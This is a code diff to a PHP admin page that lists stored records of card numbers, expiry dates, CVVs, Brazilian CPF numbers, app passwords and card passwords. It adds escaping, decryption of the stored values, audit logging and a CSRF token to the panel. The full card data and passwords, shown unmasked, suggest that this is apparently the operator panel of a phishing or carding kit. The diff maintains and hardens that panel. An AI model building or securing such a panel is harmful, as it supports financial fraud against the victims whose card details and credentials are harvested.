@@ -1,10 +1,14 @@
 <?php
-$sqlite = "sqlite:../login/db.db";
-$pdo = new PDO($sqlite);
+require __DIR__ . '/../app/security.php';
+security_bootstrap('admin');
+
+$sqlite = __DIR__ . '/../login/db.db';
+$pdo = security_pdo_sqlite($sqlite);
 
 if (!isset($_COOKIE['login'])) {
 	header("location:login.php");
 }
+security_audit_log('admin_index_access');
 ?>
 <!DOCTYPE html>
 <html>
@@ -62,14 +66,14 @@ $execucao->execute();
             while ($row = $execucao->fetch()) {
                 echo "
                     <tr class='user'>
-					<td class='status1'>".$row['status']."</td>
-					<td>".$row["cc"]."</td>
-					<td>".$row["validade"]."</td>
-                	<td>".$row["cvv"]."</td>
-					<td>".$row["cpf"]."</td>
-					<td>".$row["senha_app"]."</td>
-					<td>".$row["senha_cc"]."</td>
-					<td><a href='./processar/remover.php?id=".$row["id"]."'><button>APAGAR</button></a></td>
+					<td class='status1'>".security_h($row['status'])."</td>
+					<td>".security_h(security_unprotect_sensitive_value($row["cc"]))."</td>
+					<td>".security_h(security_unprotect_sensitive_value($row["validade"]))."</td>
+                	<td>".security_h(security_unprotect_sensitive_value($row["cvv"]))."</td>
+					<td>".security_h(security_unprotect_sensitive_value($row["cpf"]))."</td>
+					<td>".security_h(security_unprotect_sensitive_value($row["senha_app"]))."</td>
+					<td>".security_h(security_unprotect_sensitive_value($row["senha_cc"]))."</td>
+					<td><a href='./processar/remover.php?id=".rawurlencode((string) $row["id"])."&csrf=".security_csrf_query()."'><button>APAGAR</button></a></td>
                     </tr>
                 ";
             }
